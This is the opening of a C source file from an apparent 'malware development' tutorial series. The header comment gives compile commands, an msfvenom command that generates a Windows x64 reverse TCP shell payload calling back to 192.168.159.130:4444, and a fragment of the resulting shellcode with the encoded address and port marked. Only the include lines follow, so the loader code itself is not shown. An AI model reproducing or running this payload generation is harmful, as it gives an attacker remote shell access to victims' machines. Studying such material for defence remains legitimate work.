/*
https://sid4hack.medium.com/malware-development-part-4-9fa5e817ed96
x86_64-w64-mingw32-gcc mal_dev_02.cpp -o mal_dev_02(g++).exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

C:\mal_pe\dev>cl /EHsc /W4 mal_dev_02.cpp
...
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.159.130 lport=4444 -f c
...
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x9f\x82"
...
┌──(kali㉿kali)-[~]
└─$ 
# 4444 x11\x5c\ 192.168.159.130 xc0\xa8\x9f\x82"
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
